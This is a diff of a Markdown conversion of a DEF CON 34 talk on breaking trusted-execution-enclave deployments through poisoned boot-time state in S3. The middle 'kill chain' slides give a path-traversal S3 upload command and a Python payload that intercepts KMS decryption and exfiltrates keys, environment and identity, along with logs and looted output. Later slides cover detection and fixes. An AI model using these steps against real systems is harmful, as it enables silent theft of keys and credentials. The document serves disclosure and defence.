@@ -4,17 +4,21 @@ speakers: ["Sandeep Jayashankar"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v1.pptx"
 pages: 56
 sha256: "6b112f37baa7b658becd8906497009903b6d5f13555838cff74cec87c5c4fa29"
-text_chars: 30386
+text_chars: 30532
 ocr_pages: 2
 has_ocr: true
 redacted_secrets: 1
+ocr_confidence: 87.1
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:40:53Z"
+converted_at: "2026-08-12T06:47:19Z"
 ---
 # The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State
 
@@ -22,15 +26,16 @@ converted_at: "2026-08-12T00:40:53Z"
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v1.pptx` (56 pages)
 
+
 ## Slide 1
 
 ## `D E F C O N 3 4 · M A I N S T A G E` **The Enclave Is Lying to You**
 
 Breaking TEE Trust Boundaries Through Boot-Time State
 
-```
+\```
 Sandeep Jayashankargithub.com/pyro-0x
-```
+\```
 
 ## Slide 2
 
@@ -42,19 +47,19 @@ Offensive Security & Cloud Adversarial Simulation
 
 This research: coordinated disclosure complete, fixes shipped in 8 weeks
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 INTRO · 02
-```
+\```
 
 ## Slide 3
 
-```
+\```
 T H E S T A K E S
-```
+\```
 
 ##### **The industry is auditing the hardware. The bugs are in the bash scripts.**
 
@@ -62,19 +67,19 @@ Confidential computing is the fastest-growing cloud security primitive — and e
 
 `W H A T E V E R Y O N E A U D I T S W H A T N O B O D Y A U D I T S` **The silicon The deployment layer** Attestation & PCR measurements `bootstrap.sh` Memory encryption Secure boot chain `#  provision runtime, then start enclave` Formal hardware review, papers, conferences `setup_networking mount_secrets /run/secrets export LOG_LEVEL=info exec /opt/enclave/run.sh` Millions in R&D. Years of scrutiny. Copy-pasted from a quickstart. Never reviewed.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 INTRO · 03
-```
+\```
 
 ## Slide 4
 
-```
+\```
 ACT I01 / 06
-```
+\```
 
 # **The Promise**
 
@@ -86,25 +91,25 @@ What confidential computing claims — and why the industry believes it. `I II I
 
 _"A fully compromised host cannot reach into a hardware-isolated enclave."_
 
-```
+\```
 — AWS Nitro Enclaves documentation
-```
+\```
 
-```
+\```
 AWS Nitro Enclaves
-```
+\```
 
 - "Isolated compute to process highly sensitive data"
 
-```
+\```
 AMD SEV-SNP
-```
+\```
 
 "Hardware-enforced memory isolation from the hypervisor"
 
-```
+\```
 Intel TDX
-```
+\```
 
 - "Eliminate the need to trust the cloud provider"
 
@@ -112,33 +117,33 @@ Intel TDX
 
 The marketing says the hardware will save you. The hardware is not the problem.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 05
-```
+\```
 
 ## Slide 6
 
-```
+\```
 A C T I · T H E P R O M I S E
-```
+\```
 
 ##### **The TEE Trust Model**
 
-```
+\```
 untrusted · full root
-```
+\```
 
-```
+\```
 sealed · attested
-```
+\```
 
-```
+\```
 THE HOST
-```
+\```
 
 **`THE ENCLAVE`** Sealed memory · no SSH / console · attests its code — not its inputscode — not its inputs— not its inputsinputs
 
@@ -146,13 +151,13 @@ Launches the enclave · controls network + Sealed memory · no SSH / console · 
 
 ###### Boundary 2 holds.Boundaries 1 and 3 are only as good as your config
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 06
-```
+\```
 
 ## Slide 7
 
@@ -164,13 +169,13 @@ ACT I · 06
 
 The math is solid. Tamper with the binary → PCRs change → KMS refuses to decrypt. So how did we get root inside — without changing a single PCR value?
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 07
-```
+\```
 
 ## Slide 8
 
@@ -184,13 +189,13 @@ Network bridge configuration
 
 Attestation says nothing about the data the code trusts. The code is correct. The inputs are poisoned.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 08
-```
+\```
 
 ## Slide 9
 
@@ -204,19 +209,19 @@ The boot sequence is a window of total trust in an architecture designed for zer
 
 This isn't a bug in one product. It's a gap in how TEEs are deployed everywhere.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 09
-```
+\```
 
 ## Slide 10
 
-```
+\```
 A C T I · T H E P R O M I S E
-```
+\```
 
 ##### **The gap**
 
@@ -244,19 +249,19 @@ The vendor docs
 Hardware guarantee vs. deployment reality
 Don't mention any of this.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 10
-```
+\```
 
 ## Slide 11
 
-```
+\```
 A C T I · T H E P R O M I S E
-```
+\```
 
 ##### **Who's running TEE workloads? And what's inside?**
 
@@ -266,9 +271,9 @@ A C T I · T H E P R O M I S E
 
 **Crypto / DeFi**
 
-```
+\```
 Private keys, signing authority
-```
+\```
 
 MPC signing, key custody
 
@@ -280,28 +285,28 @@ MPC signing, key custody
 
 of these workloads exist specifically to protect the one asset they can't afford to lose. `T H E I R O N Y deploy.sh`
 
-```
+\```
 #  feeds the enclave every boot
 aws s3 cp
 s3://state  . -r
 python launch.py
-```
+\```
 
 The scripts guarding the crown jewels are usually bash — copied from a quickstart guide.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 11
-```
+\```
 
 ## Slide 12
 
-```
+\```
 A C T I · T H E P R O M I S E
-```
+\```
 
 ##### **Three platforms, same pattern**
 
@@ -318,41 +323,41 @@ A C T I · T H E P R O M I S E
 
 Not a Nitro problem — a confidential computing deployment problem. We tested Nitro. The architecture is the same everywhere.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT I · 12
-```
+\```
 
 ## Slide 13
 
 `A C T I I 02 / 06` **The Gap** A real deployment, its boot-time inputs, and where the trust actually breaks.
 
-```
+\```
 IIIIIIIVVVI
-```
+\```
 
 ## Slide 14
 
 `A C T I I · T H E G A P` **Architecture of a real TEE deployment**
 
-```
+\```
 W H E R E T H E A T T A C K L A N D S
-```
+\```
 
 **`Steps 01 & 02`** Attacker-controlled inputs — read from the host and external storage, never attested. **`Step 03`** Trusts the poisoned input — the KMS MITM lands here.
 
 The full boot sequence is in the diagram →
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 14
-```
+\```
 
 ## Slide 15
 
@@ -367,13 +372,13 @@ DNS Host DNAT NO NO
 
 ###### Five inputs. Zero attestation. All reach inside the enclave — its security depends entirely on things outside it.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 15
-```
+\```
 
 ## Slide 16
 
@@ -381,31 +386,31 @@ ACT II · 15
 
 `s3:PutObject` on that one bucket is the entire entry requirement. So — who holds it?
 
-```
+\```
 CI/CD service accounts — GitHub Actions, GitLab CI, Deployment automation — Terraform, CloudFormation
 Jenkins
 Developer IAM users with broad s3:* policiesThird-party integrations — backup, monitoring agents
-```
+\```
 
-```
+\```
 Or no credentials at all — a misconfigured bucket policy left world-writable
-```
+\```
 
 Principals who can write to that bucket in a typical account: dozens to hundreds. The enclave is only as strong as your weakest one.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 16
-```
+\```
 
 ## Slide 17
 
-```
+\```
 A C T I I · T H E G A P
-```
+\```
 
 ##### **Threat model: where we attacked**
 
@@ -416,43 +421,43 @@ held let us in
 
 One of those becomes root inside the enclave.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 17
-```
+\```
 
 ## Slide 18
 
-```
+\```
 A C T I I · T H E G A P
-```
+\```
 
 ##### **What was blocked**
 
 **Env var injection**
 
-```
+\```
 BLOCKED
-```
+\```
 
 17 payloads — `$(cmd)` , backticks, `;` , pipes. Stopped by a 3-layer filter.
 
 **DNS MITM + TLS bypass**
 
-```
+\```
 BLOCKED
-```
+\```
 
 iptables DNAT to an attacker IP. Stopped by certificate pinning.
 
 **RPC fuzzing**
 
-```
+\```
 STABLE
-```
+\```
 
 10,000 random / malformed inputs. No crash — hardened deserialization.
 
@@ -460,33 +465,33 @@ STABLE
 
 **`4 / 7 vectors held.`** The builder got the hard parts right — input filtering, cert pinning, hardened RPC, and a hardware-backed time source.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 18
-```
+\```
 
 ## Slide 19
 
-```
+\```
 A C T I I · T H E G A P
-```
+\```
 
 ##### **What was exploitable**
 
 **KMS without attestation**
 
-```
+\```
 CRITICAL
-```
+\```
 
 **IMDS via NAT bridge**
 
-```
+\```
 HIGH
-```
+\```
 
 Key policy missing `RecipientAttestation` . Anyone with the IAM role decrypts — no enclave needed.
 
@@ -498,25 +503,25 @@ It downloads state from S3 every boot — including Python modules the enclave i
 
 How do we get a file there? We only have `s3:PutObject` .
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 19
-```
+\```
 
 ## Slide 20
 
-```
+\```
 A C T I I · T H E G A P
-```
+\```
 
 **`../`** S3 stores object keys as opaque strings. It doesn't interpret paths. The enclave's download script writes them to the local filesystem — which does.
 
-```
+\```
 attacker@ops — bash
-```
+\```
 
 - `$ aws s3 cp payload.py "s3://bucket/state/../kms/kms_helper.py"`
 
@@ -526,27 +531,27 @@ S3 stores it literally. The filesystem resolves `../` on download. Our file land
 
 One command. One IAM permission. A path traversal from 1998 — against the most sophisticated hardware isolation money can buy.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT II · 20
-```
+\```
 
 ## Slide 21
 
-```
+\```
 A C T I I · T H E G A P
-```
+\```
 
 The enclave trusts what the host feeds it. The host is the threat model.
 
 **The entire TEE security model has a boot-time gap.** The hardware isolation is real. The deployment story defeats it. Every enclave that boots from untrusted state is only as secure as that state's storage. `THE ENCLAVE IS LYING TO YOU`
 
-```
+\```
 ACT II · 21
-```
+\```
 
 ## Slide 22
 
@@ -554,15 +559,15 @@ ACT II · 21
 
 One IAM permission to root inside the enclave. Eight steps, one command.
 
-```
+\```
 IIIIIIIVVVI
-```
+\```
 
 ## Slide 23
 
-```
+\```
 A C T I I I · T H E K I L L C H A I N
-```
+\```
 
 ##### **What you're about to see**
 
@@ -572,166 +577,166 @@ Entry requirement Host access needed `s3:PutObject` — one IAM permission None.
 
 Files uploaded Trigger One — a Python module with a traversal path Next boot cycle — deploy, patch, crash, scale
 
-```
+\```
 R E S U L T
-```
+\```
 
 **Root + DB encryption key + IAM credentials**
 
 `D E T E C T I O N` **PCR unchanged. No alerts fired.**
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 23
-```
+\```
 
 ## Slide 24
 
-```
+\```
 A C T I I I · T H E K I L L C H A I N
-```
+\```
 
 ##### **The kill chain — overview**
 
 `RECON TARGET WEAPONIZE` **`DELIVER`** `WAIT TRIGGER LOOT PERSIST` → → → `s3 cp ../` → → → → read config identify write payload next boot enclave boots keys + creds survives module one command reboot
 
-```
+\```
 Attacker effort: 1 command|Time: minutes|Detection: none
-```
+\```
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 24
-```
+\```
 
 ## Slide 25
 
-```
+\```
 A C T I I I · S T E P 1
-```
+\```
 
 ##### **Reconnaissance**
 
-```
+\```
 root@enclave-host — recon
-```
+\```
 
-```
+\```
 # ls -la /opt/enclave/environment.conf -rw-r--r-- 1 root root 247 Jul  2 09:01
 /opt/enclave/environment.conf # cat /opt/enclave/environment.conf BUCKET_NAME=enclave-state-
 XXXXXXXXXXXX KEY_ARN=arn:aws:kms:us-west-2:XXXXXXXXXXXX:key/XXXXX PAIRING_TOKEN=dummy-already-paired
 LOG_LEVEL=INFO BUCKET_COSIGNER_DIR=state
-```
+\```
 
 Permissions: 644 — world-readable. Any process on the host reads it. Now we know the bucket, the KMS key, and exactly where state lives.
 
 In practice an attacker may not even need host access — bucket names follow predictable conventions, and S3 policies are often over-permissive.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 25
-```
+\```
 
 ## Slide 26
 
 `A C T I I I · S T E P 2` **Identify the target module**
 
-```
+\```
 s3 state
-```
+\```
 
-```
+\```
 enclave modules
-```
+\```
 
-```
+\```
 $ aws s3 ls s3://…/ --recursive 4096  state/db.key # from the EIF manifest /opt/enclave/kms/kms_helper.py
 32768 state/db/secrets.db 1247← decrypt /opt/enclave/kms/__init__.py
 state/config/service.json/opt/enclave/app/main.py
-```
+\```
 
 Target: `kms_helper.py`
 
 Imported every time the enclave decrypts a secret. Overwrite it, and our code runs during the next KMS operation.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 26
-```
+\```
 
 ## Slide 27
 
-```
+\```
 A C T I I I · S T E P 3
-```
+\```
 
 ##### **Weaponize**
 
-```
+\```
 kms_helper.py — payload
-```
+\```
 
-```
+\```
 import os, json, boto3defdecrypt_string (ciphertext):
-```
+\```
 
-```
+\```
 # MITM: intercept the KMS decrypt, capture, pass through     resp = boto3.client("kms").decrypt(CiphertextBlob=ciphertext)
     plaintext = resp["Plaintext"]
-```
+\```
 
-```
+\```
 _exfil ({"plaintext_hex": plaintext.hex()})
-```
+\```
 
-```
+\```
 return plaintext   # app continues normally — no crashdef_collect ():
-```
+\```
 
-```
+\```
 # harvest identity, env, encryption keys, credentials return {"id": os.popen("id").read(), "env": dict(os.environ)}
-```
+\```
 
 Invisible: it intercepts, exfiltrates, and passes through. The app never knows.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 27
-```
+\```
 
 ## Slide 28
 
-```
+\```
 A C T I I I · S T E P 4
-```
+\```
 
 ##### **Deliver — one command**
 
-```
+\```
 attacker@ops — bash
-```
+\```
 
 - `$  aws s3 cp evil_simple.py \`
 
-```
+\```
 "s3://enclave-state-XXXX/state/../kms/kms_helper.py"upload:  ./evil_simple.py to
 s3://enclave-state-XXXX/state/../kms/kms_helper.py
-```
+\```
 
 `W H E R E S 3 S T O R E S I T state/../kms/kms_helper.py` Stored literally — the key contains `../` .
 
@@ -739,21 +744,22 @@ s3://enclave-state-XXXX/state/../kms/kms_helper.py
 
 That's it. One command. One IAM permission. A path traversal from 1998 against hardware isolation from 2024.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 28
-```
+\```
 
 ## Slide 29
 
-```
+\```
 THE ENCLAVE IS LYING TO YOUACT III · 29
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What S3 sees
@@ -770,24 +776,18 @@ Key Size
 =) state/checkpoint. json 2.0 KB
 =) state/logs/2025-05-20.1log 128 KB
 | $3 treats the entire string as a literal key.
-r
 What the filesystem does on download
 The OS resolves the path during write.
 ",." moves up one directory.
 /opt/enclave/
 @) Start at
-pm atatel @----------- /opt/enclave/state/
-i Ee db. key
-, checkpoint. json ® Encounter "../”
 ! Go UP one level
-y t+— logs/
 aws s3 sync > \ L— db/
 kms / ¢------------ ® Then go into
 /opt/enclave/kms/
 * Write kms_helper.py
 — other/ i OVERWRITTEN!
 -— config.yaml Laer @ Legitimate file
-Ls README.md wv’ has been replaced.
 The filesystem resolves the path.
 The write lands OUTSIDE the state/ directory.
 |
@@ -800,136 +800,136 @@ ACT III
 
 ## Slide 30
 
-```
+\```
 A C T I I I · S T E P 5
-```
+\```
 
 ##### **Wait for boot**
 
 ###### The attacker doesn't trigger the boot. They just wait.
 
-```
+\```
 Scheduled deployment — weekly / monthly, most common
-```
+\```
 
-```
+\```
 Security patch cycle — patching triggers the exploit
-```
+\```
 
-```
+\```
 Auto-scaling event — traffic spike = more compromised
 instances
-```
+\```
 
-```
+\```
 Crash recovery — systemd restarts the service
-```
+\```
 
 Average time to next boot: < 7 days. The payload sits in S3 indefinitely.
 
 Fleet-wide impact: every instance that boots from this bucket is compromised. Auto-scaling = mass exploitation. Multiregion shared buckets: one write, global impact. This isn't "compromise one box" — it's compromise the source of truth.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 30
-```
+\```
 
 ## Slide 31
 
-```
+\```
 A C T I I I · S T E P 6
-```
+\```
 
 ##### **Trigger — the enclave boots**
 
-```
+\```
 enclave-service — boot log
-```
+\```
 
-```
+\```
 [bootstrap] Downloading state from S3 bucket 'enclave-state-XXXX'… [bootstrap]   Downloaded state/db.key
 [bootstrap]   Downloaded state/../kms/kms_helper.py[bootstrap]  State download complete. Starting application…
 [app] Loading KMS module from /opt/enclave/kms/kms_helper.py [app] Decrypting database key via KMS…
 EXFIL_SUCCESS: uploaded to s3://enclave-state-XXXX/exfiltrated/dump.json KMS_MITM_SUCCESS: plaintext key
 intercepted [app] Database key loaded. Starting RPC listener on vsock CID 100.
-```
+\```
 
 The bootstrap logs show the traversal path being downloaded. No alert fires. The app starts normally. Our code ran. Nobody noticed.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 31
-```
+\```
 
 ## Slide 32
 
-```
+\```
 A C T I I I · S T E P 7
-```
+\```
 
 ##### **Loot — what we extracted**
 
-```
+\```
 exfiltrated/dump.json
-```
+\```
 
-```
+\```
 {
 "id": "uid=0(root) gid=0(root) groups=0(root)" ,
-```
+\```
 
 - `"hostname" : "enclave-i-0a1b2c3d4e5f67890", "env" : {`
 
-```
+\```
 "BUCKET_NAME" : "enclave-state-XXXXXXXXXXXX",
-```
+\```
 
-```
+\```
 "KEY_ARN" : "arn:aws:kms:us-west-2:XXXX:key/XXXXX",
-```
+\```
 
-```
+\```
 "AWS_ACCESS_KEY_ID": "ASIA[REDACTED:aws-access-key-id]" ,
-```
+\```
 
-```
+\```
 "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7…EXAMPLEKEY" ,
-```
+\```
 
 - `"AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEBYa…"   },`
 
-```
+\```
 "/tmp/db.key": "a7e3f19b42d8c056e1b4f27a8c3d6e90…" }
-```
+\```
 
 Root. Inside the hardware-isolated enclave. With its own IAM credentials — and the database encryption key.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 32
-```
+\```
 
 ## Slide 33
 
 `A C T I I I · S T E P 7 B` **The KMS MITM — plaintext key capture**
 
-```
+\```
 exfiltrated/kms_mitm.json
-```
+\```
 
-```
+\```
 {
 "attack" : "KMS decrypt intercepted inside Nitro Enclave",
-```
+\```
 
 - `"plaintext_hex": "6158627c25e11907234763691b6e9b6d" ,`
 
@@ -941,19 +941,19 @@ exfiltrated/kms_mitm.json
 
 The enclave decrypted its own secret — through our code. No error. No crash. No timeout. With this key, the attacker decrypts the secrets database offline, forever.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 33
-```
+\```
 
 ## Slide 34
 
-```
+\```
 A C T I I I · S T E P 8
-```
+\```
 
 ##### **Attestation check — the punchline**
 
@@ -961,29 +961,30 @@ A C T I I I · S T E P 8
 
 - `$ nitro-cli describe-eif | jq -r .Measurements.PCR0 $ nitro-cli describe-eif | jq -r .Measurements.PCR0 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b 2a4c6d8e0 2a4c6d8e0`
 
-```
+\```
 PCR0 UNCHANGEDATTESTATION: VALID
-```
+\```
 
 ###### We didn't modify the enclave image. We modified what it downloads.
 
 PCR values hash the code — not the data. Attestation says "the binary is correct." It's right. The binary just loaded our module instead of the real one.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 34
-```
+\```
 
 ## Slide 35
 
-```
+\```
 THE ENCLAVE IS LYING TO YOUACT III · 35
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 WHAT ATTESTATION SEES WHAT’S ACTUALLY INSIDE
@@ -997,7 +998,6 @@ Kernel: VALID ;
 Application: VALID Detection: NONE
 | ATTESTATION: PASSED | | STATE: COMPROMISED |
 ' | Same enclave. :
-Racers weciens nat J Same: PGR WOLUGS bes enrese crores werent '
 Same attestation |
 document. |
 Attestation proves the CODE is correct.
@@ -1009,9 +1009,9 @@ THE ENCLAVE IS LYING TO YOU ACT III : 35
 
 For a crypto custody service moving $5M+/day, the gap between "key theft" and "fund theft" is a few lines of Python.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOUACT III · 36
-```
+\```
 
 ## Slide 37
 
@@ -1021,39 +1021,39 @@ THE ENCLAVE IS LYING TO YOUACT III · 36
 
 Everything you just saw, uncut — one command to root, keys, and credentials.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 37
-```
+\```
 
 ## Slide 38
 
 ### **Pause.**
 
-```
+\```
 One IAM permission. One file. A path traversal from 1998.
-```
+\```
 
-```
+\```
 Attestation: VALID
-```
+\```
 
-```
+\```
 Enclave state: COMPROMISED
 Root, keys, credentials: EXFILTRATED
-```
+\```
 
-```
+\```
 The enclave is still running. Nobody knows.
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 38
-```
+\```
 
 ## Slide 39
 
@@ -1065,13 +1065,13 @@ Same blast radius. Same persistence. But attestation stays unchanged — no sign
 
 This is a supply chain attack on the boottime data plane.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT III · 39
-```
+\```
 
 ## Slide 40
 
@@ -1083,11 +1083,11 @@ Every step of that attack — and why none of it shows up in your logs. `I II II
 
 `A C T I V · T H E S I L E N C E` **What the attack looks like in CloudTrail**
 
-```
+\```
 cloudtrail — event
-```
+\```
 
-```
+\```
 {
 "eventName" : "PutObject",
 "userIdentity" : {
@@ -1099,23 +1099,23 @@ cloudtrail — event
 "key": "state/../kms/kms_helper.py"   },
 "sourceIPAddress" : "198.51.100.42"
 }
-```
+\```
 
 One log entry. Looks like a normal deployment artifact upload. No alert fires unless you're specifically looking for `../` in S3 keys.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT IV · 41
-```
+\```
 
 ## Slide 42
 
-```
+\```
 A C T I V · T H E S I L E N C E
-```
+\```
 
 ##### **What doesn't get logged**
 
@@ -1133,13 +1133,13 @@ detection cellsblind
 leave a trace, and b|.Once code runs inside sealed memo
 oth look like routine deploys.|ry —no EDR, no strace, no observa|bility.Only the two S3 bookends|
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT IV · 42
-```
+\```
 
 ## Slide 43
 
@@ -1155,13 +1155,13 @@ ACT IV · 42
 
 - `5 · KMS decrypt frequency` Baseline per boot, alert on spikes
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT IV · 43
-```
+\```
 
 ## Slide 44
 
@@ -1169,15 +1169,15 @@ ACT IV · 43
 
 What actually closes the gap — and how the vendor shipped it in eight weeks.
 
-```
+\```
 IIIIIIIVVVI
-```
+\```
 
 ## Slide 45
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### **"But why not just sign the S3 objects?"**
 
@@ -1191,41 +1191,41 @@ A C T V · T H E F I X
 
 The enclave is the only entity that can unwrap the state. Even if S3 is poisoned, the data is useless without the enclave's attestation.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 45
-```
+\```
 
 ## Slide 46
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### **The fix — shipped 8 weeks later**
 
-```
+\```
 download_state_secure.py
-```
+\```
 
 `def download_state_secure (bucket, prefix, local_dir): allowed = load_allowlist("/opt/enclave/expected_files.txt") for obj in  s3.list_objects_v2(Bucket=bucket, Prefix=prefix)["Contents"]: key = obj["Key"] normalized = os.path.normpath(os.path.relpath(key, prefix)) if ".." in normalized.split(os.sep):   # traversal raise  SecurityError(f"Path traversal: {key}") if normalized not in allowed:            # allowlist continue         dest = os.path.realpath(os.path.join(local_dir, normalized)) if not  dest.startswith(os.path.realpath(local_dir)): raise SecurityError(f"Boundary escape: {dest}")   # ← key check         s3.download_file(bucket, key, dest) S H I P P E D B Y T H E V E N D O R O W N E D B Y T H E O P E R A T O R` Hardened download path + attestation-gated KMS, baked into the enclave Lock down bucket IAM, filter IMDS at the bridge, enable versioning + audit. image. Live in a subsequent build. Config outside the image.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 46
-```
+\```
 
 ## Slide 47
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### `VENDOR-SHIPPED` **The complete fix — 8 layers**
 
@@ -1241,19 +1241,19 @@ A C T V · T H E F I X
 |`8`|`No-overwrite`|`lexists() blocks symlink races`|
 |An|y single layer blocks the attack.|Together: comprehensive.|
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 47
-```
+\```
 
 ## Slide 48
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### `OPERATOR-OWNED` **KMS policy fix — enforce attestation**
 
@@ -1271,19 +1271,19 @@ A C T V · T H E F I X
 
 Now only the exact enclave image can call KMS Decrypt. PCR values come from `nitro-cli build-enclave` — pin them, update on each release.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 48
-```
+\```
 
 ## Slide 49
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### **5 checks to run Monday morning**
 
@@ -1302,19 +1302,19 @@ A C T V · T H E F I X
 `Audit trail`|`get-bucket-versioning → not Enabled = blind`|
 |Or just rununtrust scan—|it checks all five and more ..|
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 49
-```
+\```
 
 ## Slide 50
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### **untrust — open-source TEE scanner**
 
@@ -1341,19 +1341,19 @@ A C T V · T H E F I X
 
 One command against the live deployment — the same five findings, flagged in seconds.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT V · 51
-```
+\```
 
 ## Slide 52
 
-```
+\```
 A C T V · T H E F I X
-```
+\```
 
 ##### **Disclosure timeline**
 
@@ -1381,13 +1381,13 @@ Let's be fair to the silicon — it did exactly what it promised.
 
 Nobody broke the crypto. Nobody broke the silicon. The vulnerability class is in what the TEE trusts — and it's the industry default.
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT VI · 53
-```
+\```
 
 ## Slide 55
 
@@ -1397,26 +1397,26 @@ Attestation covers the code — it says nothing about the data the code trusts. 
 
 **`1 2 3`** Your bootstrap script is your security Encrypt state at rest with attestationTreat the host as fully compromised — boundary — treat it like kernel code conditioned KMS — untrusted storage because your threat model says it is becomes irrelevant
 
-```
+\```
 THE ENCLAVE IS LYING TO YOU
-```
+\```
 
-```
+\```
 ACT VI · 54
-```
+\```
 
 ## Slide 56
 
 #### **The enclave is lying to you. Find out how.**
 
-```
+\```
 $ pip install untrust && untrust scan
-```
+\```
 
 One command. Run it tonight.
 
-```
+\```
 Sandeep Jayashankargithub.com/pyro-0x
-```
+\```
 
 ###### **Questions?**
